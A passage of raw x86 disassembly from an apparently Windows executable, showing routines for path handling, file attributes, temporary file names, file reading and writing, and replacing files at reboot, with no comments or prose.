  405ed8:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405edf:	74 15                	je     0x405ef6
  405ee1:	8b 45 0c             	mov    0xc(%ebp),%eax
  405ee4:	83 e0 03             	and    $0x3,%eax
  405ee7:	3c 03                	cmp    $0x3,%al
  405ee9:	75 3f                	jne    0x405f2a
  405eeb:	ff 75 0c             	push   0xc(%ebp)
  405eee:	57                   	push   %edi
  405eef:	e8 f4 fe ff ff       	call   0x405de8
  405ef4:	eb 34                	jmp    0x405f2a
  405ef6:	ff 75 fc             	push   -0x4(%ebp)
  405ef9:	57                   	push   %edi
  405efa:	e8 a1 fe ff ff       	call   0x405da0
  405eff:	85 c0                	test   %eax,%eax
  405f01:	75 1f                	jne    0x405f22
  405f03:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405f06:	74 12                	je     0x405f1a
  405f08:	57                   	push   %edi
  405f09:	6a f1                	push   $0xfffffff1
  405f0b:	e8 51 f8 ff ff       	call   0x405761
  405f10:	6a 00                	push   $0x0
  405f12:	57                   	push   %edi
  405f13:	e8 84 05 00 00       	call   0x40649c
  405f18:	eb 10                	jmp    0x405f2a
  405f1a:	ff 05 e8 9a 42 00    	incl   0x429ae8
  405f20:	eb 08                	jmp    0x405f2a
  405f22:	57                   	push   %edi
  405f23:	6a f2                	push   $0xfffffff2
  405f25:	e8 37 f8 ff ff       	call   0x405761
  405f2a:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405f30:	50                   	push   %eax
  405f31:	56                   	push   %esi
  405f32:	ff 15 3c 81 40 00    	call   *0x40813c
  405f38:	85 c0                	test   %eax,%eax
  405f3a:	0f 85 63 ff ff ff    	jne    0x405ea3
  405f40:	56                   	push   %esi
  405f41:	ff 15 38 81 40 00    	call   *0x408138
  405f47:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405f4b:	74 05                	je     0x405f52
  405f4d:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405f52:	33 f6                	xor    %esi,%esi
  405f54:	39 75 08             	cmp    %esi,0x8(%ebp)
  405f57:	74 4b                	je     0x405fa4
  405f59:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405f5c:	75 08                	jne    0x405f66
  405f5e:	ff 05 e8 9a 42 00    	incl   0x429ae8
  405f64:	eb 3e                	jmp    0x405fa4
  405f66:	57                   	push   %edi
  405f67:	e8 cd 0a 00 00       	call   0x406a39
  405f6c:	85 c0                	test   %eax,%eax
  405f6e:	74 34                	je     0x405fa4
  405f70:	57                   	push   %edi
  405f71:	e8 35 00 00 00       	call   0x405fab
  405f76:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405f79:	0c 01                	or     $0x1,%al
  405f7b:	50                   	push   %eax
  405f7c:	57                   	push   %edi
  405f7d:	e8 1e fe ff ff       	call   0x405da0
  405f82:	85 c0                	test   %eax,%eax
  405f84:	75 16                	jne    0x405f9c
  405f86:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405f89:	74 d3                	je     0x405f5e
  405f8b:	57                   	push   %edi
  405f8c:	6a f1                	push   $0xfffffff1
  405f8e:	e8 ce f7 ff ff       	call   0x405761
  405f93:	56                   	push   %esi
  405f94:	57                   	push   %edi
  405f95:	e8 02 05 00 00       	call   0x40649c
  405f9a:	eb 08                	jmp    0x405fa4
  405f9c:	57                   	push   %edi
  405f9d:	6a e5                	push   $0xffffffe5
  405f9f:	e8 bd f7 ff ff       	call   0x405761
  405fa4:	5f                   	pop    %edi
  405fa5:	5e                   	pop    %esi
  405fa6:	5b                   	pop    %ebx
  405fa7:	c9                   	leave
  405fa8:	c2 08 00             	ret    $0x8
  405fab:	56                   	push   %esi
  405fac:	8b 74 24 08          	mov    0x8(%esp),%esi
  405fb0:	56                   	push   %esi
  405fb1:	e8 3c 07 00 00       	call   0x4066f2
  405fb6:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405fb9:	50                   	push   %eax
  405fba:	56                   	push   %esi
  405fbb:	ff 15 fc 81 40 00    	call   *0x4081fc
  405fc1:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405fc5:	74 0b                	je     0x405fd2
  405fc7:	68 14 a0 40 00       	push   $0x40a014
  405fcc:	56                   	push   %esi
  405fcd:	e8 26 07 00 00       	call   0x4066f8
  405fd2:	8b c6                	mov    %esi,%eax
  405fd4:	5e                   	pop    %esi
  405fd5:	c2 04 00             	ret    $0x4
  405fd8:	8b 44 24 04          	mov    0x4(%esp),%eax
  405fdc:	eb 0e                	jmp    0x405fec
  405fde:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405fe3:	74 0f                	je     0x405ff4
  405fe5:	50                   	push   %eax
  405fe6:	ff 15 08 82 40 00    	call   *0x408208
  405fec:	66 8b 08             	mov    (%eax),%cx
  405fef:	66 85 c9             	test   %cx,%cx
  405ff2:	75 ea                	jne    0x405fde
  405ff4:	c2 08 00             	ret    $0x8
  405ff7:	56                   	push   %esi
  405ff8:	8b 74 24 08          	mov    0x8(%esp),%esi
  405ffc:	56                   	push   %esi
  405ffd:	e8 f0 06 00 00       	call   0x4066f2
  406002:	8d 04 46             	lea    (%esi,%eax,2),%eax
  406005:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  406009:	74 0c                	je     0x406017
  40600b:	50                   	push   %eax
  40600c:	56                   	push   %esi
  40600d:	ff 15 fc 81 40 00    	call   *0x4081fc
  406013:	3b c6                	cmp    %esi,%eax
  406015:	77 ee                	ja     0x406005
  406017:	66 83 20 00          	andw   $0x0,(%eax)
  40601b:	83 c0 02             	add    $0x2,%eax
  40601e:	5e                   	pop    %esi
  40601f:	c2 04 00             	ret    $0x4
  406022:	8b 54 24 04          	mov    0x4(%esp),%edx
  406026:	66 8b 0a             	mov    (%edx),%cx
  406029:	8b c1                	mov    %ecx,%eax
  40602b:	0c 20                	or     $0x20,%al
  40602d:	66 83 f9 5c          	cmp    $0x5c,%cx
  406031:	75 06                	jne    0x406039
  406033:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  406037:	74 13                	je     0x40604c
  406039:	66 3d 61 00          	cmp    $0x61,%ax
  40603d:	72 12                	jb     0x406051
  40603f:	66 3d 7a 00          	cmp    $0x7a,%ax
  406043:	77 0c                	ja     0x406051
  406045:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  40604a:	75 05                	jne    0x406051
  40604c:	33 c0                	xor    %eax,%eax
  40604e:	40                   	inc    %eax
  40604f:	eb 02                	jmp    0x406053
  406051:	33 c0                	xor    %eax,%eax
  406053:	c2 04 00             	ret    $0x4
  406056:	53                   	push   %ebx
  406057:	56                   	push   %esi
  406058:	8b 35 08 82 40 00    	mov    0x408208,%esi
  40605e:	57                   	push   %edi
  40605f:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406063:	57                   	push   %edi
  406064:	ff d6                	call   *%esi
  406066:	8b d8                	mov    %eax,%ebx
  406068:	53                   	push   %ebx
  406069:	ff d6                	call   *%esi
  40606b:	66 8b 0f             	mov    (%edi),%cx
  40606e:	66 85 c9             	test   %cx,%cx
  406071:	74 12                	je     0x406085
  406073:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  406077:	75 0c                	jne    0x406085
  406079:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  40607e:	75 05                	jne    0x406085
  406080:	50                   	push   %eax
  406081:	ff d6                	call   *%esi
  406083:	eb 28                	jmp    0x4060ad
  406085:	66 83 f9 5c          	cmp    $0x5c,%cx
  406089:	75 20                	jne    0x4060ab
  40608b:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  40608f:	75 1a                	jne    0x4060ab
  406091:	6a 02                	push   $0x2
  406093:	5e                   	pop    %esi
  406094:	6a 5c                	push   $0x5c
  406096:	50                   	push   %eax
  406097:	4e                   	dec    %esi
  406098:	e8 3b ff ff ff       	call   0x405fd8
  40609d:	66 83 38 00          	cmpw   $0x0,(%eax)
  4060a1:	74 08                	je     0x4060ab
  4060a3:	40                   	inc    %eax
  4060a4:	40                   	inc    %eax
  4060a5:	85 f6                	test   %esi,%esi
  4060a7:	75 eb                	jne    0x406094
  4060a9:	eb 02                	jmp    0x4060ad
  4060ab:	33 c0                	xor    %eax,%eax
  4060ad:	5f                   	pop    %edi
  4060ae:	5e                   	pop    %esi
  4060af:	5b                   	pop    %ebx
  4060b0:	c2 04 00             	ret    $0x4
  4060b3:	56                   	push   %esi
  4060b4:	57                   	push   %edi
  4060b5:	ff 74 24 0c          	push   0xc(%esp)
  4060b9:	be 58 57 42 00       	mov    $0x425758,%esi
  4060be:	56                   	push   %esi
  4060bf:	e8 18 06 00 00       	call   0x4066dc
  4060c4:	56                   	push   %esi
  4060c5:	e8 8c ff ff ff       	call   0x406056
  4060ca:	8b f8                	mov    %eax,%edi
  4060cc:	85 ff                	test   %edi,%edi
  4060ce:	75 04                	jne    0x4060d4
  4060d0:	33 c0                	xor    %eax,%eax
  4060d2:	eb 58                	jmp    0x40612c
  4060d4:	57                   	push   %edi
  4060d5:	e8 b0 08 00 00       	call   0x40698a
  4060da:	f6 05 78 9a 42 00 80 	testb  $0x80,0x429a78
  4060e1:	74 0e                	je     0x4060f1
  4060e3:	66 8b 07             	mov    (%edi),%ax
  4060e6:	66 85 c0             	test   %ax,%ax
  4060e9:	74 e5                	je     0x4060d0
  4060eb:	66 3d 5c 00          	cmp    $0x5c,%ax
  4060ef:	74 df                	je     0x4060d0
  4060f1:	2b fe                	sub    %esi,%edi
  4060f3:	d1 ff                	sar    $1,%edi
  4060f5:	eb 14                	jmp    0x40610b
  4060f7:	e8 3d 09 00 00       	call   0x406a39
  4060fc:	85 c0                	test   %eax,%eax
  4060fe:	74 05                	je     0x406105
  406100:	f6 00 10             	testb  $0x10,(%eax)
  406103:	74 cb                	je     0x4060d0
  406105:	56                   	push   %esi
  406106:	e8 ec fe ff ff       	call   0x405ff7
  40610b:	56                   	push   %esi
  40610c:	e8 e1 05 00 00       	call   0x4066f2
  406111:	3b c7                	cmp    %edi,%eax
  406113:	56                   	push   %esi
  406114:	7f e1                	jg     0x4060f7
  406116:	e8 90 fe ff ff       	call   0x405fab
  40611b:	56                   	push   %esi
  40611c:	ff 15 dc 80 40 00    	call   *0x4080dc
  406122:	33 c9                	xor    %ecx,%ecx
  406124:	83 f8 ff             	cmp    $0xffffffff,%eax
  406127:	0f 95 c1             	setne  %cl
  40612a:	8b c1                	mov    %ecx,%eax
  40612c:	5f                   	pop    %edi
  40612d:	5e                   	pop    %esi
  40612e:	c2 04 00             	ret    $0x4
  406131:	55                   	push   %ebp
  406132:	8b ec                	mov    %esp,%ebp
  406134:	51                   	push   %ecx
  406135:	53                   	push   %ebx
  406136:	56                   	push   %esi
  406137:	57                   	push   %edi
  406138:	8b 3d 28 81 40 00    	mov    0x408128,%edi
  40613e:	ff 75 0c             	push   0xc(%ebp)
  406141:	ff d7                	call   *%edi
  406143:	8b 75 08             	mov    0x8(%ebp),%esi
  406146:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406149:	eb 27                	jmp    0x406172
  40614b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40614e:	ff 75 0c             	push   0xc(%ebp)
  406151:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  406154:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  406158:	56                   	push   %esi
  406159:	ff 15 70 80 40 00    	call   *0x408070
  40615f:	85 c0                	test   %eax,%eax
  406161:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406164:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  406167:	74 1a                	je     0x406183
  406169:	56                   	push   %esi
  40616a:	ff 15 74 82 40 00    	call   *0x408274
  406170:	8b f0                	mov    %eax,%esi
  406172:	56                   	push   %esi
  406173:	ff d7                	call   *%edi
  406175:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  406178:	7d d1                	jge    0x40614b
  40617a:	33 c0                	xor    %eax,%eax
  40617c:	5f                   	pop    %edi
  40617d:	5e                   	pop    %esi
  40617e:	5b                   	pop    %ebx
  40617f:	c9                   	leave
  406180:	c2 08 00             	ret    $0x8
  406183:	8b c6                	mov    %esi,%eax
  406185:	eb f5                	jmp    0x40617c
  406187:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40618b:	56                   	push   %esi
  40618c:	8b 74 24 10          	mov    0x10(%esp),%esi
  406190:	85 f6                	test   %esi,%esi
  406192:	76 0f                	jbe    0x4061a3
  406194:	8b 44 24 0c          	mov    0xc(%esp),%eax
  406198:	2b c1                	sub    %ecx,%eax
  40619a:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  40619d:	88 11                	mov    %dl,(%ecx)
  40619f:	41                   	inc    %ecx
  4061a0:	4e                   	dec    %esi
  4061a1:	75 f7                	jne    0x40619a
  4061a3:	5e                   	pop    %esi
  4061a4:	c2 0c 00             	ret    $0xc
  4061a7:	56                   	push   %esi
  4061a8:	ff 74 24 08          	push   0x8(%esp)
  4061ac:	ff 15 dc 80 40 00    	call   *0x4080dc
  4061b2:	8b f0                	mov    %eax,%esi
  4061b4:	83 fe ff             	cmp    $0xffffffff,%esi
  4061b7:	74 0d                	je     0x4061c6
  4061b9:	24 fe                	and    $0xfe,%al
  4061bb:	50                   	push   %eax
  4061bc:	ff 74 24 0c          	push   0xc(%esp)
  4061c0:	ff 15 d8 80 40 00    	call   *0x4080d8
  4061c6:	8b c6                	mov    %esi,%eax
  4061c8:	5e                   	pop    %esi
  4061c9:	c2 04 00             	ret    $0x4
  4061cc:	ff 74 24 04          	push   0x4(%esp)
  4061d0:	ff 15 dc 80 40 00    	call   *0x4080dc
  4061d6:	8b c8                	mov    %eax,%ecx
  4061d8:	6a 00                	push   $0x0
  4061da:	41                   	inc    %ecx
  4061db:	f7 d9                	neg    %ecx
  4061dd:	1b c9                	sbb    %ecx,%ecx
  4061df:	23 c8                	and    %eax,%ecx
  4061e1:	51                   	push   %ecx
  4061e2:	ff 74 24 14          	push   0x14(%esp)
  4061e6:	6a 00                	push   $0x0
  4061e8:	6a 01                	push   $0x1
  4061ea:	ff 74 24 1c          	push   0x1c(%esp)
  4061ee:	ff 74 24 1c          	push   0x1c(%esp)
  4061f2:	ff 15 cc 80 40 00    	call   *0x4080cc
  4061f8:	c2 0c 00             	ret    $0xc
  4061fb:	55                   	push   %ebp
  4061fc:	8b ec                	mov    %esp,%ebp
  4061fe:	51                   	push   %ecx
  4061ff:	51                   	push   %ecx
  406200:	56                   	push   %esi
  406201:	8b 75 08             	mov    0x8(%ebp),%esi
  406204:	57                   	push   %edi
  406205:	6a 64                	push   $0x64
  406207:	5f                   	pop    %edi
  406208:	a1 a8 a5 40 00       	mov    0x40a5a8,%eax
  40620d:	4f                   	dec    %edi
  40620e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406211:	a1 ac a5 40 00       	mov    0x40a5ac,%eax
  406216:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406219:	ff 15 d0 80 40 00    	call   *0x4080d0
  40621f:	6a 1a                	push   $0x1a
  406221:	33 d2                	xor    %edx,%edx
  406223:	59                   	pop    %ecx
  406224:	f7 f1                	div    %ecx
  406226:	56                   	push   %esi
  406227:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40622a:	6a 00                	push   $0x0
  40622c:	50                   	push   %eax
  40622d:	ff 75 0c             	push   0xc(%ebp)
  406230:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  406234:	ff 15 74 80 40 00    	call   *0x408074
  40623a:	85 c0                	test   %eax,%eax
  40623c:	75 0d                	jne    0x40624b
  40623e:	85 ff                	test   %edi,%edi
  406240:	75 c6                	jne    0x406208
  406242:	66 21 3e             	and    %di,(%esi)
  406245:	5f                   	pop    %edi
  406246:	5e                   	pop    %esi
  406247:	c9                   	leave
  406248:	c2 08 00             	ret    $0x8
  40624b:	8b c6                	mov    %esi,%eax
  40624d:	eb f6                	jmp    0x406245
  40624f:	55                   	push   %ebp
  406250:	8b ec                	mov    %esp,%ebp
  406252:	56                   	push   %esi
  406253:	8b 75 10             	mov    0x10(%ebp),%esi
  406256:	8d 45 10             	lea    0x10(%ebp),%eax
  406259:	6a 00                	push   $0x0
  40625b:	50                   	push   %eax
  40625c:	56                   	push   %esi
  40625d:	ff 75 0c             	push   0xc(%ebp)
  406260:	ff 75 08             	push   0x8(%ebp)
  406263:	ff 15 30 81 40 00    	call   *0x408130
  406269:	85 c0                	test   %eax,%eax
  40626b:	74 0a                	je     0x406277
  40626d:	3b 75 10             	cmp    0x10(%ebp),%esi
  406270:	75 05                	jne    0x406277
  406272:	33 c0                	xor    %eax,%eax
  406274:	40                   	inc    %eax
  406275:	eb 02                	jmp    0x406279
  406277:	33 c0                	xor    %eax,%eax
  406279:	5e                   	pop    %esi
  40627a:	5d                   	pop    %ebp
  40627b:	c2 0c 00             	ret    $0xc
  40627e:	55                   	push   %ebp
  40627f:	8b ec                	mov    %esp,%ebp
  406281:	56                   	push   %esi
  406282:	8b 75 10             	mov    0x10(%ebp),%esi
  406285:	8d 45 10             	lea    0x10(%ebp),%eax
  406288:	6a 00                	push   $0x0
  40628a:	50                   	push   %eax
  40628b:	56                   	push   %esi
  40628c:	ff 75 0c             	push   0xc(%ebp)
  40628f:	ff 75 08             	push   0x8(%ebp)
  406292:	ff 15 b8 80 40 00    	call   *0x4080b8
  406298:	85 c0                	test   %eax,%eax
  40629a:	74 0a                	je     0x4062a6
  40629c:	3b 75 10             	cmp    0x10(%ebp),%esi
  40629f:	75 05                	jne    0x4062a6
  4062a1:	33 c0                	xor    %eax,%eax
  4062a3:	40                   	inc    %eax
  4062a4:	eb 02                	jmp    0x4062a8
  4062a6:	33 c0                	xor    %eax,%eax
  4062a8:	5e                   	pop    %esi
  4062a9:	5d                   	pop    %ebp
  4062aa:	c2 0c 00             	ret    $0xc
  4062ad:	55                   	push   %ebp
  4062ae:	8b ec                	mov    %esp,%ebp
  4062b0:	53                   	push   %ebx
  4062b1:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4062b4:	56                   	push   %esi
  4062b5:	8b 35 34 81 40 00    	mov    0x408134,%esi
  4062bb:	57                   	push   %edi
  4062bc:	33 ff                	xor    %edi,%edi
  4062be:	6a 01                	push   $0x1
  4062c0:	57                   	push   %edi
  4062c1:	57                   	push   %edi
  4062c2:	53                   	push   %ebx
  4062c3:	ff d6                	call   *%esi
  4062c5:	85 c0                	test   %eax,%eax
  4062c7:	75 4f                	jne    0x406318
  4062c9:	8d 45 0a             	lea    0xa(%ebp),%eax
  4062cc:	6a 02                	push   $0x2
  4062ce:	50                   	push   %eax
  4062cf:	53                   	push   %ebx
  4062d0:	e8 7a ff ff ff       	call   0x40624f
  4062d5:	85 c0                	test   %eax,%eax
  4062d7:	74 0c                	je     0x4062e5
  4062d9:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  4062df:	75 04                	jne    0x4062e5
  4062e1:	33 c0                	xor    %eax,%eax
  4062e3:	eb 36                	jmp    0x40631b
  4062e5:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  4062e8:	74 28                	je     0x406312
  4062ea:	6a 01                	push   $0x1
  4062ec:	57                   	push   %edi
  4062ed:	57                   	push   %edi
  4062ee:	53                   	push   %ebx
  4062ef:	ff d6                	call   *%esi
  4062f1:	85 c0                	test   %eax,%eax
  4062f3:	75 1d                	jne    0x406312
  4062f5:	6a 02                	push   $0x2
  4062f7:	68 14 84 40 00       	push   $0x408414
  4062fc:	53                   	push   %ebx
  4062fd:	e8 7c ff ff ff       	call   0x40627e
  406302:	f7 d8                	neg    %eax
  406304:	1b c0                	sbb    %eax,%eax
  406306:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  40630b:	05 05 40 00 80       	add    $0x80004005,%eax
  406310:	eb 09                	jmp    0x40631b
  406312:	57                   	push   %edi
  406313:	57                   	push   %edi
  406314:	57                   	push   %edi
  406315:	53                   	push   %ebx
  406316:	ff d6                	call   *%esi
  406318:	33 c0                	xor    %eax,%eax
  40631a:	40                   	inc    %eax
  40631b:	5f                   	pop    %edi
  40631c:	5e                   	pop    %esi
  40631d:	5b                   	pop    %ebx
  40631e:	5d                   	pop    %ebp
  40631f:	c2 08 00             	ret    $0x8
  406322:	53                   	push   %ebx
  406323:	8b 1d ec 80 40 00    	mov    0x4080ec,%ebx
  406329:	55                   	push   %ebp
  40632a:	56                   	push   %esi
  40632b:	8b 74 24 14          	mov    0x14(%esp),%esi
  40632f:	57                   	push   %edi
  406330:	85 f6                	test   %esi,%esi
  406332:	c7 05 f0 65 42 00 4e 	movl   $0x55004e,0x4265f0
  406339:	00 55 00 
  40633c:	c7 05 f4 65 42 00 4c 	movl   $0x4c,0x4265f4
  406343:	00 00 00 
  406346:	bf 00 04 00 00       	mov    $0x400,%edi
  40634b:	bd f0 65 42 00       	mov    $0x4265f0,%ebp
  406350:	74 26                	je     0x406378
  406352:	6a 01                	push   $0x1
  406354:	6a 00                	push   $0x0
  406356:	56                   	push   %esi
  406357:	e8 70 fe ff ff       	call   0x4061cc
  40635c:	50                   	push   %eax
  40635d:	ff 15 fc 80 40 00    	call   *0x4080fc
  406363:	57                   	push   %edi
  406364:	55                   	push   %ebp
  406365:	56                   	push   %esi
  406366:	ff d3                	call   *%ebx
  406368:	85 c0                	test   %eax,%eax
  40636a:	0f 84 27 01 00 00    	je     0x406497
  406370:	3b c7                	cmp    %edi,%eax
  406372:	0f 8f 1f 01 00 00    	jg     0x406497
  406378:	be f0 6d 42 00       	mov    $0x426df0,%esi
  40637d:	57                   	push   %edi
  40637e:	56                   	push   %esi
  40637f:	ff 74 24 1c          	push   0x1c(%esp)
  406383:	ff d3                	call   *%ebx
  406385:	85 c0                	test   %eax,%eax
  406387:	0f 84 0a 01 00 00    	je     0x406497
  40638d:	3b c7                	cmp    %edi,%eax
  40638f:	0f 8f 02 01 00 00    	jg     0x406497
  406395:	56                   	push   %esi
  406396:	55                   	push   %ebp
  406397:	68 c0 a5 40 00       	push   $0x40a5c0
  40639c:	68 f0 61 42 00       	push   $0x4261f0
  4063a1:	ff 15 78 82 40 00    	call   *0x408278
  4063a7:	8b d8                	mov    %eax,%ebx
  4063a9:	a1 70 9a 42 00       	mov    0x429a70,%eax
  4063ae:	83 c4 10             	add    $0x10,%esp
  4063b1:	ff b0 28 01 00 00    	push   0x128(%eax)
  4063b7:	56                   	push   %esi
  4063b8:	e8 5c 03 00 00       	call   0x406719
  4063bd:	6a 04                	push   $0x4
  4063bf:	68 00 00 00 c0       	push   $0xc0000000
  4063c4:	56                   	push   %esi
  4063c5:	e8 02 fe ff ff       	call   0x4061cc
  4063ca:	8b e8                	mov    %eax,%ebp
  4063cc:	83 fd ff             	cmp    $0xffffffff,%ebp
  4063cf:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4063d3:	0f 84 be 00 00 00    	je     0x406497
  4063d9:	6a 00                	push   $0x0
  4063db:	55                   	push   %ebp
  4063dc:	ff 15 c8 80 40 00    	call   *0x4080c8
  4063e2:	8b f8                	mov    %eax,%edi
  4063e4:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  4063e8:	50                   	push   %eax
  4063e9:	6a 40                	push   $0x40
  4063eb:	ff 15 10 81 40 00    	call   *0x408110
  4063f1:	8b f0                	mov    %eax,%esi
  4063f3:	85 f6                	test   %esi,%esi
  4063f5:	0f 84 95 00 00 00    	je     0x406490
  4063fb:	57                   	push   %edi
  4063fc:	56                   	push   %esi
  4063fd:	55                   	push   %ebp
  4063fe:	e8 4c fe ff ff       	call   0x40624f
  406403:	85 c0                	test   %eax,%eax
  406405:	0f 84 85 00 00 00    	je     0x406490
  40640b:	68 b4 a5 40 00       	push   $0x40a5b4
  406410:	56                   	push   %esi
  406411:	e8 1b fd ff ff       	call   0x406131
  406416:	85 c0                	test   %eax,%eax
  406418:	75 14                	jne    0x40642e
  40641a:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  40641d:	68 b4 a5 40 00       	push   $0x40a5b4
  406422:	50                   	push   %eax
  406423:	ff 15 4c 81 40 00    	call   *0x40814c
  406429:	83 c7 0a             	add    $0xa,%edi
  40642c:	eb 35                	jmp    0x406463
  40642e:	83 c0 0a             	add    $0xa,%eax
  406431:	68 b0 a5 40 00       	push   $0x40a5b0
  406436:	50                   	push   %eax
  406437:	e8 f5 fc ff ff       	call   0x406131
  40643c:	8b e8                	mov    %eax,%ebp
  40643e:	85 ed                	test   %ebp,%ebp
  406440:	74 1d                	je     0x40645f
  406442:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406445:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  406448:	eb 06                	jmp    0x406450
  40644a:	8a 11                	mov    (%ecx),%dl
  40644c:	88 10                	mov    %dl,(%eax)
  40644e:	48                   	dec    %eax
  40644f:	49                   	dec    %ecx
  406450:	3b cd                	cmp    %ebp,%ecx
  406452:	77 f6                	ja     0x40644a
  406454:	2b ee                	sub    %esi,%ebp
  406456:	45                   	inc    %ebp
  406457:	8b c5                	mov    %ebp,%eax
  406459:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  40645d:	eb 06                	jmp    0x406465
  40645f:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406463:	8b c7                	mov    %edi,%eax
  406465:	53                   	push   %ebx
  406466:	03 c6                	add    %esi,%eax
  406468:	68 f0 61 42 00       	push   $0x4261f0
  40646d:	50                   	push   %eax
  40646e:	e8 14 fd ff ff       	call   0x406187
  406473:	33 c0                	xor    %eax,%eax
  406475:	50                   	push   %eax
  406476:	50                   	push   %eax
  406477:	50                   	push   %eax
  406478:	55                   	push   %ebp
  406479:	ff 15 34 81 40 00    	call   *0x408134
  40647f:	03 fb                	add    %ebx,%edi
  406481:	57                   	push   %edi
  406482:	56                   	push   %esi
  406483:	55                   	push   %ebp
  406484:	e8 f5 fd ff ff       	call   0x40627e
  406489:	56                   	push   %esi
  40648a:	ff 15 0c 81 40 00    	call   *0x40810c
  406490:	55                   	push   %ebp
  406491:	ff 15 fc 80 40 00    	call   *0x4080fc
  406497:	5f                   	pop    %edi
  406498:	5e                   	pop    %esi
  406499:	5d                   	pop    %ebp
  40649a:	5b                   	pop    %ebx
  40649b:	c3                   	ret
  40649c:	6a 05                	push   $0x5
  40649e:	ff 74 24 0c          	push   0xc(%esp)
  4064a2:	ff 74 24 0c          	push   0xc(%esp)
  4064a6:	ff 15 50 81 40 00    	call   *0x408150
  4064ac:	85 c0                	test   %eax,%eax
  4064ae:	75 0f                	jne    0x4064bf
  4064b0:	ff 74 24 08          	push   0x8(%esp)
  4064b4:	ff 74 24 08          	push   0x8(%esp)
  4064b8:	e8 65 fe ff ff       	call   0x406322
  4064bd:	59                   	pop    %ecx
  4064be:	59                   	pop    %ecx
  4064bf:	ff 05 f0 9a 42 00    	incl   0x429af0
  4064c5:	c2 08 00             	ret    $0x8
  4064c8:	53                   	push   %ebx
  4064c9:	33 db                	xor    %ebx,%ebx
  4064cb:	38 1d 1c 9b 42 00    	cmp    %bl,0x429b1c
  4064d1:	56                   	push   %esi
  4064d2:	8b 74 24 10          	mov    0x10(%esp),%esi
  4064d6:	57                   	push   %edi
  4064d7:	0f 9c c3             	setl   %bl
  4064da:	8b 06                	mov    (%esi),%eax
  4064dc:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4064e0:	f7 db                	neg    %ebx
  4064e2:	1b db                	sbb    %ebx,%ebx
  4064e4:	32 db                	xor    %bl,%bl
  4064e6:	81 c3 00 01 00 00    	add    $0x100,%ebx
  4064ec:	a8 20                	test   $0x20,%al
  4064ee:	74 32                	je     0x406522
  4064f0:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  4064f6:	74 2a                	je     0x406522
  4064f8:	8b cf                	mov    %edi,%ecx
  4064fa:	ba 00 03 00 00       	mov    $0x300,%edx
  4064ff:	c1 e9 15             	shr    $0x15,%ecx
  406502:	23 ca                	and    %edx,%ecx
  406504:	3b ca                	cmp    %edx,%ecx
  406506:	75 0a                	jne    0x406512
  406508:	8b cb                	mov    %ebx,%ecx
  40650a:	f7 d1                	not    %ecx
  40650c:	23 0d 10 9b 42 00    	and    0x429b10,%ecx
  406512:	80 e4 fe             	and    $0xfe,%ah
  406515:	0b c1                	or     %ecx,%eax
  406517:	80 e4 fd             	and    $0xfd,%ah
  40651a:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  406520:	eb 0d                	jmp    0x40652f
  406522:	a9 00 00 10 00       	test   $0x100000,%eax
  406527:	74 06                	je     0x40652f
  406529:	0b 05 10 9b 42 00    	or     0x429b10,%eax
  40652f:	8b c8                	mov    %eax,%ecx
  406531:	23 c3                	and    %ebx,%eax
  406533:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  406539:	f7 d8                	neg    %eax
  40653b:	1b c0                	sbb    %eax,%eax
  40653d:	89 0e                	mov    %ecx,(%esi)
  40653f:	f7 d0                	not    %eax
  406541:	23 c7                	and    %edi,%eax
  406543:	5f                   	pop    %edi
  406544:	5e                   	pop    %esi
  406545:	5b                   	pop    %ebx
  406546:	c2 08 00             	ret    $0x8
  406549:	55                   	push   %ebp
  40654a:	8b ec                	mov    %esp,%ebp
  40654c:	8d 45 10             	lea    0x10(%ebp),%eax
  40654f:	50                   	push   %eax
  406550:	ff 75 08             	push   0x8(%ebp)
  406553:	e8 70 ff ff ff       	call   0x4064c8
  406558:	85 c0                	test   %eax,%eax
  40655a:	75 05                	jne    0x406561
  40655c:	6a 06                	push   $0x6
  40655e:	58                   	pop    %eax
  40655f:	eb 12                	jmp    0x406573
  406561:	ff 75 14             	push   0x14(%ebp)
  406564:	ff 75 10             	push   0x10(%ebp)
  406567:	6a 00                	push   $0x0
